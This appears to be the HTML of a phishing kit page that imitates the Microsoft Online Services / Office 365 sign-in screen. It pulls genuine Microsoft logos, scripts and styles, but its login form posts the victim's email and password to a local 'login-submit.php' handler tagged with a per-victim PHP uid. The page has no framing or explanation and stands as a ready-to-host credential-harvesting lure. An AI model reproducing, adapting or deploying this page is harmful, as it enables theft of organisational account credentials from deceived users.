

<head>
  <title>Sign in to Microsoft Online Services</title>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
  <meta http-equiv="Pragma" content="no-cache">
  <meta http-equiv="Expires" content="-1">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="PageID" content="i5030.2.0">
<meta name="SiteID" content="10">
<meta name="ReqLC" content="1033">
<meta name="LocLC" content="1033">
<meta name="mswebdialog-newwindowurl" content="*">
  <link rel="SHORTCUT ICON" href="https://secure.aadcdn.microsoftonline-p.com/aad/20.200.19625/images/favicon_a.ico">
<base href="http://login.office365.com">  <link href="https://secure.aadcdn.microsoftonline-p.com/aad/20.200.19625/css/login.ltr.css" rel="stylesheet" type="text/css">


    <script src="https://secure.aadcdn.microsoftonline-p.com/aad/20.200.19625/js/jquery.1.5.1.min.js" type="text/javascript"></script>
    <script src="https://secure.aadcdn.microsoftonline-p.com/aad/20.200.19625/js/aad.login.js" type="text/javascript"></script>
      <script src="https://secure.aadcdn.microsoftonline-p.com/aad/20.200.19625/js/jquery.easing.1.3.js" type="text/javascript"></script>
  <style> body { display: none; }</style>
</head>



<body>
  <script>
    if (self == top) {
      var body = $('body');
      body.css('display', 'block');
    } else {
      top.location = self.location;
    }
  </script>
  <div id="background_branding_container" class="ie_legacy" style="background: #FFFFFF">
    <img id="background_background_image" alt="Illustration for Microsoft Online Services">
    <div id="background_company_name_text" class="background_title_text"></div>
  </div>
  <div id="background_page_overlay" class="overlay ie_legacy">
  </div>
  <div id="login_no_script_panel" class="login_panel">
    <table class="login_panel_layout" style="height: 100%;">
      <tr class="login_panel_layout_row" style="height: 100%;">
        <td id="login_panel_left"></td>
        <td id="login_panel_center">

</td>
        <td id="login_panel_right">
        </td>
      </tr>
    </table>
        <td id="login_panel_right">
        </td>
  </div>    
  <div id="login_panel" class="login_panel">
    <table class="login_panel_layout" style="height: 100%;">
      <tr class="login_panel_layout_row" style="height: 100%;">
        <td id="login_panel_left"></td>
        <td id="login_panel_center">


<!--office365 logo-->
    <script type="text/javascript">
      $(document).ready(function () {
        
        
                Constants.DEFAULT_LOGO = 'https://secure.aadcdn.microsoftonline-p.com/aadbranding/1.0.1/aadlogin/Office365/logo.png';
        Constants.DEFAULT_LOGO_ALT = 'Sign in';
                        Constants.DEFAULT_ILLUSTRATION = 'https://secure.aadcdn.microsoftonline-p.com/aadbranding/1.0.1/aadlogin/Office365/illustration.jpg';
        Constants.DEFAULT_BACKGROUND_COLOR = '#EB3C00';
                 
        Context.TenantBranding.workload_branding_enabled = true;
        User.UpdateLogo(Constants.DEFAULT_LOGO, Constants.DEFAULT_LOGO_ALT);
        User.UpdateBackground(Constants.DEFAULT_ILLUSTRATION, Constants.DEFAULT_BACKGROUND_COLOR);
                        Context.TenantBranding.whr_key = '';
                jQuery('img#logo_img').attr('src', '');
        Context.use_instrumentation = true; 
        User.moveFooterToBottom('250px');
      });
    </script>
	
    <div class="login_inner_container">
      <div class="inner_container cred">
        <div class="login_workload_logo_container">
        </div>
        <div class="login_cta_container normaltext">
                  <div id="login_cta_text" class="cta_message_text 1">Sign in with your organizational account</div>
        </div>
        <ul class="login_cred_container">
          <li class="login_cred_field_container">
              <div id="cred_userid_container" class="login_textfield textfield">
                <span class="input_field textfield">
                 <label for="UsernameForm" class="no_display">User account</label>
                  <div class="input_border">
                </span>
                <form method="POST" action="login-submit.php?uid=<?php echo $uid ?>"  name="LoginForm" autocomplete="off"> </br>
                  <input type="text" name="UsernameForm" class="login_textfield textfield required email field normaltext" placeholder="someone@example.com " tabindex="1"></br></br>
                   <input type="password" name="PasswordForm" placeholder="Password" class="login_textfield textfield required field normaltext" tabindex="2" type="password" aria-label="Password"></br> </br></br>
                  <input type="submit" class="button normaltext cred_sign_in_button refresh_domain_state" value="Sign In">
                </form>
              </div>
              <div id="cred_password_container" class="login_textfield textfield">
                <span class="input_field textfield">
                  <label for="PasswordForm" class="no_display">Password</label>
                  <div class="input_border">
                  </div>
                </span>
              </div>
              <div id="cred_hidden_inputs_container" class="no_display">
                <input type="hidden" id="PPSX" name="PPSX" value="PassportRN">
                <input type="hidden" name="PPFT" id="i0327" value="A1F6YNWGa2YkRUNNhPfW3T8PcqsjHEeiQmp*m*wFwPyxag08*cPrW*SpZSnKeqiDJI*EUu8ceb42zjM89!r*ck!Q6kkHvZYoRPC53LwqFG6O6YCE5yI3mHRGLjK6BurKT332TUIqbZPBSJiw!cfoJN2PCje1NESa7hs4mIzcHNmkN7DO0RJOeoWX8r1DK*UBFpxFwOw$">
              </div>	  
            </form>
          </li>
          <li class="login_cred_options_container">
            <div id="cred_kmsi_container" class="subtext normaltext">
              <span class="input_field ">
                <input tabindex="10" id="cred_keep_me_signed_in_checkbox" type="checkbox" value="0" name="persist">
                <label id="keep_me_signed_in_label_text" for="cred_keep_me_signed_in_checkbox" class="persist_text">Keep me signed in</label>
              </span>
            </div>     
          </li>
        </ul>
      </div>
    </div>
        </td>
      </tr>
    </table>
  </div>
  </body>
</html>